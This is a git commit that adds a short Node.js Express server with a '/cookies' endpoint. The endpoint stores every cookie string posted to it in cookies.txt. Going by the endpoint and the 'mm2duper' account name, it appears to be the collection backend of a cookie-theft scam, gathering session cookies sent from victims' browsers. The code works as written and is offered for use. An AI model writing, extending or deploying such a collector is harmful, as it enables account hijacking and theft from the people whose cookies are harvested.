870318005473d0e5a929d0852cfc0e1391cd77ee
mm2duper <112780967+mm2duper@users.noreply.github.com>
2024-04-24 05:11:23 -0300

    Add files via upload

---
+++ node.js
@@ -0,0 +1,19 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+
+const app = express();
+app.use(bodyParser.json());
+
+app.post('/cookies', (req, res) => {
+    const cookies = req.body.cookies;
+    fs.appendFile('cookies.txt', cookies + '\n', (err) => {
+        if (err) throw err;
+        console.log('Cookies salvos com sucesso!');
+    });
+    res.sendStatus(200);
+});
+
+app.listen(3000, () => {
+    console.log('Servidor rodando na porta 3000');
+});
